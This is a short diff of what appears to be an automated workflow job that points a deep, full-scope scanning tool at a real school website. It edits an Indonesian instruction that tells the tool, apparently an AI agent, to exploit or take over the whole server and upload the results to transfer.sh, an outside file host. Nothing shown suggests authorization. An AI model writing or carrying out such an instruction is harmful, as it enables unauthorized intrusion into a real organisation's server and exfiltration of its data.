@@ -46,5 +46,5 @@ jobs:
             --target https://smkdaka.sch.id \
             --scan-mode deep \
             --scope-mode full \
-            --instruction "tugasmu adalah mengeksploitasi seluruh server,dan hasilnya upload dengan tranfer.sh dan berikan urlnya"
+            --instruction "ambil alih server,dan hasilnya upload dengan tranfer.sh dan berikan urlnya"
             
